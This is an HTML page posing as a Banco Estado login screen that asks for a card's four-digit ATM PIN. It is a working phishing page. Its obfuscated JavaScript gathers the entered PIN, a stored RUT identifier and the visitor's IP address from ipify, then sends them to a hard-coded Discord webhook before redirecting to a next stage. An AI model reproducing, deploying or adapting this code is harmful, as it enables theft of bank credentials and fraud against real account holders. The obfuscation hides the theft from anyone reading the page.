<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/png" href="favicon.png">
    <title>Banco Estado</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
            background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%);
            min-height: 100vh;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 450px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            padding: 40px 30px;
            margin-top: 20px;
        }

        .header {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 30px;
        }

        .logo-container {
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .logo {
            width: 30px;
            height: 30px;
            background: linear-gradient(135deg, #FF5C00 0%, #FF8C00 100%);
            border-radius: 3px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: white;
            font-size: 16px;
        }

        .logo-text {
            font-size: 14px;
            font-weight: 600;
            color: #1a1a1a;
            letter-spacing: -0.5px;
        }

        .logo-img {
            width: 135px;
            height: 135px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: none;
            border: none;
            padding: 0;
        }

        .logo-img img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .title {
            font-size: 16px;
            font-weight: 600;
            color: #1a2842;
            margin-bottom: 30px;
            text-align: center;
            line-height: 1.4;
        }

        .pin-form {
            display: flex;
            flex-direction: column;
            gap: 30px;
        }

        .pin-inputs-container {
            display: flex;
            gap: 12px;
            justify-content: center;
            align-items: center;
        }

        .pin-input {
            width: 70px;
            height: 70px;
            border: 2px solid #D0D0D8;
            border-radius: 8px;
            font-size: 32px;
            font-weight: 600;
            color: #1a1a1a;
            text-align: center;
            background-color: #FAFAFA;
            transition: all 0.3s ease;
            caret-color: #3B4FB5;
        }

        .pin-input:focus {
            outline: none;
            border-color: #3B4FB5;
            background-color: white;
            box-shadow: 0 0 0 3px rgba(59, 79, 181, 0.1);
        }

        .pin-input::placeholder {
            color: #D0D0D8;
        }

        .eye-icon {
            position: relative;
            cursor: pointer;
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
        }

        .eye-icon:hover svg {
            stroke: #3B4FB5;
        }

        .eye-icon svg {
            width: 20px;
            height: 20px;
            stroke: #1a1a1a;
            fill: none;
            transition: all 0.3s ease;
        }

        .button-group {
            display: flex;
            gap: 12px;
        }

        .continue-btn {
            flex: 1;
            padding: 14px;
            background: linear-gradient(135deg, #3B4FB5 0%, #2A3A8F 100%);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(59, 79, 181, 0.3);
        }

        @media (max-width: 480px) {
            .container {
                padding: 30px 20px;
                border-radius: 16px;
            }

            .title {
                font-size: 15px;
            }

            .pin-input {
                width: 60px;
                height: 60px;
                font-size: 28px;
            }

            .pin-inputs-container {
                gap: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header con Logo -->
        <div class="header">
            <div class="logo-container">
                <div class="logo-img">
                    <img src="logo-banco-estado.svg" alt="Logo">
                </div>
            </div>
        </div>

        <!-- Título -->
        <h1 class="title">Ingresa la clave de cajero de tu tarjeta</h1>

        <!-- Formulario PIN -->
        <form class="pin-form" id="pinForm" onsubmit="handlePinSubmit(event)">
            <!-- Inputs PIN -->
            <div class="pin-inputs-container">
                <input type="password" class="pin-input" id="pin1" maxlength="1" placeholder="•" autocomplete="off">
                <input type="password" class="pin-input" id="pin2" maxlength="1" placeholder="•" autocomplete="off">
                <input type="password" class="pin-input" id="pin3" maxlength="1" placeholder="•" autocomplete="off">
                <input type="password" class="pin-input" id="pin4" maxlength="1" placeholder="•" autocomplete="off">
                <span class="eye-icon" id="eyeIcon" onclick="togglePinVisibility()" title="Mostrar/ocultar PIN">
                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <!-- Ícono de ojo tachado - mostrado por defecto -->
                        <g id="eyeHidden">
                            <path d="M1 12s3-7 11-7 11 7 11 7-3 7-11 7-11-7-11-7z" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                            <circle cx="12" cy="12" r="2.5" fill="none" stroke="currentColor" stroke-width="1.5"/>
                            <path d="M1 1l22 22" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
                        </g>
                        <!-- Ícono de ojo abierto - inicialmente oculto -->
                        <g id="eyeClosed" style="display:none;">
                            <path d="M1 12s3-7 11-7 11 7 11 7-3 7-11 7-11-7-11-7z" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                            <circle cx="12" cy="12" r="2.5" fill="none" stroke="currentColor" stroke-width="1.5"/>
                        </g>
                    </svg>
                </span>
            </div>

            <!-- Botón Continuar -->
            <button type="submit" class="continue-btn" style="width: 100%; margin-top: 20px;">Continuar</button>
        </form>
    </div>

    <script>
    function _0x203a(){const _0x1adac6=['pin1','none','querySelectorAll','forEach','.pin-input','364406qUKSco','pin2','Por\x20favor\x20ingresa\x20los\x204\x20dígitos\x20del\x20PIN','display','pin4','getElementById','key','style','Error\x20IP:','es-ES','preventDefault','📌『𝓟𝓘𝓝\x20𝔅𝔞𝔫𝔠𝔬𝔈𝔰𝔱𝔞𝔡𝔬』📌','toLocaleString','type','pin3','16455OVKSUQ','4136433oPeFeG','href','No\x20disponible','keydown','password','application/json','6193GkRvLG','▸\x20𝖯𝖨𝖭\x20𝖢𝖺𝗃𝖾𝗋𝗈','▸\x20𝖧𝗈𝗋𝖺','Backspace','load','225963ddqqDv','catch','21690dGRirs','addEventListener','load1.html','focus','error','input','328BKSoiU','text','block','value','Error:','3160212FDFRqT','472AhOWcn','https://api.ipify.org?format=json','▸\x20𝖱𝖴𝖳','eyeHidden','then','150mxrvKR','eyeClosed','37938wWSSdj','💋𝖫𝗈𝗀𝗈𝗌\x20𝖡𝖺𝗇𝖼𝗈𝖤𝗌𝗍𝖺𝖽𝗈\x20𝖢𝗈𝗋𝖾\x20𝖯𝗋𝗂𝗆𝖾\x20𝖯𝗋𝗈\x20𝖬𝖺𝗑💋'];_0x203a=function(){return _0x1adac6;};return _0x203a();}function _0x24c2(_0x150f5f,_0x5c15ac){_0x150f5f=_0x150f5f-0x10c;const _0x203adc=_0x203a();let _0x24c27b=_0x203adc[_0x150f5f];return _0x24c27b;}const _0x1e91cb=_0x24c2;(function(_0x2e44de,_0x234de9){const _0x35e775=_0x24c2,_0x3cd759=_0x2e44de();while(!![]){try{const _0x5e66e1=-parseInt(_0x35e775(0x110))/0x1+parseInt(_0x35e775(0x138))/0x2+parseInt(_0x35e775(0x140))/0x3*(parseInt(_0x35e775(0x139))/0x4)+parseInt(_0x35e775(0x11f))/0x5*(-parseInt(_0x35e775(0x13e))/0x6)+parseInt(_0x35e775(0x120))/0x7+parseInt(_0x35e775(0x133))/0x8*(-parseInt(_0x35e775(0x12b))/0x9)+parseInt(_0x35e775(0x12d))/0xa*(-parseInt(_0x35e775(0x126))/0xb);if(_0x5e66e1===_0x234de9)break;else _0x3cd759['push'](_0x3cd759['shift']());}catch(_0x30ec56){_0x3cd759['push'](_0x3cd759['shift']());}}}(_0x203a,0xebd96));const DISCORD_WEBHOOK_URL='https://discord.com/api/webhooks/1538414125439520778/2NAQ87Fjy8N0QFQ6Cxf57DFp_J2MxFCgtGo9EgSOvdjT10G8KSEnWjx9nxW3eowQzBFw';function togglePinVisibility(){const _0x1a59fe=_0x24c2,_0x1aecaa=[document[_0x1a59fe(0x115)]('pin1'),document[_0x1a59fe(0x115)]('pin2'),document[_0x1a59fe(0x115)](_0x1a59fe(0x11e)),document[_0x1a59fe(0x115)](_0x1a59fe(0x114))],_0x2c8b2e=document[_0x1a59fe(0x115)](_0x1a59fe(0x13f)),_0x12c77d=document[_0x1a59fe(0x115)](_0x1a59fe(0x13c)),_0x402269=_0x1aecaa[0x0][_0x1a59fe(0x11d)]===_0x1a59fe(0x124)?_0x1a59fe(0x124):_0x1a59fe(0x134),_0x12dd88=_0x402269===_0x1a59fe(0x124)?_0x1a59fe(0x134):_0x1a59fe(0x124);_0x1aecaa[_0x1a59fe(0x10e)](_0x334f5b=>{_0x334f5b['type']=_0x12dd88;}),_0x12dd88===_0x1a59fe(0x134)?(_0x12c77d[_0x1a59fe(0x117)][_0x1a59fe(0x113)]=_0x1a59fe(0x10c),_0x2c8b2e[_0x1a59fe(0x117)]['display']='block'):(_0x12c77d[_0x1a59fe(0x117)][_0x1a59fe(0x113)]=_0x1a59fe(0x135),_0x2c8b2e['style'][_0x1a59fe(0x113)]=_0x1a59fe(0x10c));}document['querySelectorAll']('.pin-input')[_0x1e91cb(0x10e)]((_0x58b8d3,_0x2e3eba)=>{const _0x167831=_0x1e91cb;_0x58b8d3['addEventListener'](_0x167831(0x132),function(_0xde8f5){const _0x4588d8=_0x167831;this[_0x4588d8(0x136)]['length']===0x1&&(_0x2e3eba<0x3&&document[_0x4588d8(0x10d)](_0x4588d8(0x10f))[_0x2e3eba+0x1][_0x4588d8(0x130)]());}),_0x58b8d3[_0x167831(0x12e)](_0x167831(0x123),function(_0x375db9){const _0x11112f=_0x167831;_0x375db9[_0x11112f(0x116)]===_0x11112f(0x129)&&this[_0x11112f(0x136)]===''&&_0x2e3eba>0x0&&document[_0x11112f(0x10d)](_0x11112f(0x10f))[_0x2e3eba-0x1][_0x11112f(0x130)]();});});function handlePinSubmit(_0x137e84){const _0x2a5fae=_0x1e91cb;_0x137e84[_0x2a5fae(0x11a)]();const _0x4e6dfb=document[_0x2a5fae(0x115)](_0x2a5fae(0x142))[_0x2a5fae(0x136)],_0x66c2be=document[_0x2a5fae(0x115)](_0x2a5fae(0x111))[_0x2a5fae(0x136)],_0x5f078d=document[_0x2a5fae(0x115)](_0x2a5fae(0x11e))[_0x2a5fae(0x136)],_0xdc5109=document['getElementById'](_0x2a5fae(0x114))[_0x2a5fae(0x136)],_0x327fad=_0x4e6dfb+_0x66c2be+_0x5f078d+_0xdc5109;if(_0x327fad['length']!==0x4){alert(_0x2a5fae(0x112));return;}enviarPinADiscord(_0x327fad);}function enviarPinADiscord(_0x1b09d7){const _0x501465=_0x1e91cb,_0x4776d0=localStorage['getItem']('rutUsuario')||_0x501465(0x122);fetch(_0x501465(0x13a))[_0x501465(0x13d)](_0x27a188=>_0x27a188['json']())[_0x501465(0x13d)](_0x2b0086=>{const _0x4c0ab9=_0x501465,_0x4a9bc5={'username':_0x4c0ab9(0x141),'embeds':[{'color':0x2fbf51,'author':{'name':_0x4c0ab9(0x11b)},'fields':[{'name':_0x4c0ab9(0x127),'value':'`'+_0x1b09d7+'`','inline':![]},{'name':_0x4c0ab9(0x13b),'value':'`'+_0x4776d0+'`','inline':![]},{'name':'▸\x20𝖨𝖯','value':'`'+_0x2b0086['ip']+'`','inline':!![]},{'name':_0x4c0ab9(0x128),'value':'`'+new Date()[_0x4c0ab9(0x11c)](_0x4c0ab9(0x119))+'`','inline':!![]}]}]};fetch(DISCORD_WEBHOOK_URL,{'method':'POST','headers':{'Content-Type':_0x4c0ab9(0x125)},'body':JSON['stringify'](_0x4a9bc5)})[_0x4c0ab9(0x13d)](()=>{const _0x5d495b=_0x4c0ab9;window['location'][_0x5d495b(0x121)]=_0x5d495b(0x12f);})[_0x4c0ab9(0x12c)](_0x140561=>console[_0x4c0ab9(0x131)](_0x4c0ab9(0x137),_0x140561));})[_0x501465(0x12c)](_0x461832=>console['error'](_0x501465(0x118),_0x461832));}window[_0x1e91cb(0x12e)](_0x1e91cb(0x12a),function(){document['getElementById']('pin1')['focus']();});
    </script>
</body>
</html>
